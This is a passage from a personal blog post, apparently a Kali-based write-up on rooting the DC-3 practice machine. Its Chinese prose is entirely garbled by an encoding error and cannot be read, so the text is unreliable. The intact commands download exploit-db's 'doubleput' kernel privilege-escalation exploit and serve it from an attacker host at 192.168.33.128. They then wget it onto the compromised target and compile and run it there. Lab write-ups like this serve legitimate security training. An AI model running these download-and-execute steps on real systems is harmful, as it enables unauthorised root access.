<p>å…ˆåœ¨kaliæ”»å‡»æœºä¸Šwgetä¸‹æ¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;offensive-security&#x2F;exploitdb-bin-sploits&#x2F;raw&#x2F;master&#x2F;bin-sploits&#x2F;39772.zip</span><br></pre></td></tr></table></figure>

<p>ç„¶åä¸Šä¼ åˆ°æœ¬åœ°æœåŠ¡å™¨ä¸Šã€‚</p>
<blockquote>
<p>è¿™é‡Œå¦‚æœä¸æƒ³ç”¨80ç«¯å£ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è¯¥å‘½ä»¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 9999</span><br></pre></td></tr></table></figure>
</blockquote>
<p>ç„¶ååœ¨äº¤äº’shellä¸Šwgetä¸‹è½½</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.33.128&#x2F;dc3.zip</span><br></pre></td></tr></table></figure>

<p>ä¸€å¼€å§‹å‡ºç°äº†è¿™æ ·çš„é—®é¢˜</p>
<p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/3-4.png" alt="3-4"></p>
<p>ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯æœåŠ¡å™¨ç«¯çš„é—®é¢˜ï¼Œåæ¥å‘ç°æ˜¯è¿™ä¸ªæ–‡ä»¶å¤¹æ²¡æœ‰å¯å†™çš„æƒé™ã€‚</p>
<p>æ‰¾äº†ä¸€ä¸ªæœ‰å¯å†™æƒé™çš„ç›®å½•å°±ä¸‹è½½æˆåŠŸäº†ï¼</p>
<p>è§£å‹ä¸€ä¸‹ï¼Œç„¶åå…ˆåæŒ‰ç…§æ•™ç¨‹æ‰§è¡Œä¸¤ä¸ªè„šæœ¬å°±å¯ä»¥äº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;compile.sh</span><br><span class="line">.&#x2F;doubleput</span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/3-5.png" alt="3-5"></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">George</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/">http://yoursite.com/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><div class="addthis_inline_share_toolbox pull-right"></div><script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=undefined" async></script><nav id="pagination"><div class="next-post pull-right"><a href="/2021/03/21/linux100%E8%AE%B2/"><span>linux100è®²</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By George</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body></html>